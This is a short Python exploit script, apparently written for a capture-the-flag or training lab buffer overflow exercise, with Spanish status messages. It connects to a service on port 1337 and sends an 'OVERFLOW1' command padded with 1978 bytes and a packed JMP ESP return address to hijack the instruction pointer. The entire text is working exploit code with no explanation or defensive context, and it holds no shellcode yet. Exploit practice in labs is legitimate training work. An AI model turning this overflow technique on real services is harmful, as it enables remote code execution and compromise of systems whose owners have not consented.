#!/usr/bin/python3

import socket
import struct

HOST = "10.10.68.180"
PORT = 1337

to_reach_EIP = 1978
to_reach_JMPESP = 0x62501203

try:
    print(f"(+) Modulando y saltando a JMP, eso ESPero.")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +
        struct.pack('<I', to_reach_JMPESP)
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
